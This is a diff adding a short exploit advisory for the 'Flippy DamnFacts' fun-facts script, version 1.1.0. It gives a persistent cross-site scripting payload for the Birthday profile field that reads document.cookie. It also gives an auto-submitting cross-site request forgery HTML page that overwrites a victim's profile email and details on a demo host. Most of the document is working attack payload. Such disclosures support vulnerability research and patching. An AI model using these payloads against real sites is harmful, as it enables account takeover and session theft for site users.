@@ -1,0 +1,34 @@
+# Exploit Title:  Flippy DamnFacts - Viral Fun Facts Sharing Script 1.1.0 - Persistent cross site scripting / Cross site request forgery
+# Date: 2018-05-20
+# Dork: N/A
+# Exploit Author: borna nematzadeh (L0RD)
+# Vendor Homepage: https://www.codegrape.com/item/flippy-damnfacts-viral-fun-facts-sharing-script/3630
+# Version: 1.1.0
+# Tested on: Kali linux
+
+# POC 1 : Persistent Cross site scripting :
+1) After creating an account , navigate to "Edit profile" .
+2) Put this payload into the "Birthday" and save changes :
+" onmouseover=alert(document.cookie) "
+3) You will have an alert box in the page .
+
+# POC 2 : Cross site request forgery :
+
+<html>
+<head>
+  <title>CSRF POC</title>
+</head>
+  <body>
+    <form action="http://damnfacts.flippydemos.com/submit_profile.php" method="POST">
+      <input type="hidden" name="sex" value="Male" />
+      <input type="hidden" name="birthday" value="test" />
+      <input type="hidden" name="uEmail" value="ninjaassassinbn&#64;yahoo&#46;com" />
+      <input type="hidden" name="country" value="United&#32;States" />
+      <input type="hidden" name="about" value="test" />
+    </form>
+    <script>
+      document.forms[0].submit();
+      // profile will be updated successfully.
+    </script>
+  </body>
+</html>
